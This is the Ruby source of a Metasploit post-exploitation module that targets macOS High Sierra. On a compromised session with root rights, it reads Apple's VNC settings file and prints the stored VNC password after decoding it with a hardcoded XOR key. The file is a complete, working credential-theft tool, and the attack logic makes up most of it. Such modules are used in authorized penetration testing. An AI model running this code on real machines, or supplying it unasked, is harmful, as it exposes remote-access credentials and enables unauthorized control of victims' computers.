##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post
  include Msf::Post::OSX::Priv

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'OS X Display Apple VNC Password',
        'Description'   => %q{
            This module show Apple VNC Password from Mac OS X High Sierra.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Kevin Gonzalvo <interhack[at]gmail.com>'],
        'Platform'      => [ 'osx' ],
        'SessionTypes'  => [ "meterpreter", "shell" ]
      ))

  end

  def run
    case session.type
    when /meterpreter/
      host = sysinfo["Computer"]
    when /shell/
      host = cmd_exec("hostname")
    end

    print_status("Running module against #{host}")

    if is_root?
      print_status("This session is running as root!")
      print_status("Checking VNC Password...")
      exist = cmd_exec("if [ -f /Library/Preferences/com.apple.VNCSettings.txt ];then echo 1; else echo 0; fi;")
      if exist == '1'
        print_good("Password Found: " + cmd_exec("sudo cat /Library/Preferences/com.apple.VNCSettings.txt | perl -wne 'BEGIN { @k = unpack \"C*\", pack \"H*\", \"1734516E8BA8C5E2FF1C39567390ADCA\"}; chomp; @p = unpack \"C*\", pack \"H*\", $_; foreach (@k) { printf\"%c\", $_ ^ (shift @p || 0) };'"))
      else
        print_error("The VNC Password has not been found")
      end
    else
      print_error("It is necessary to be root!")
    end
  end
end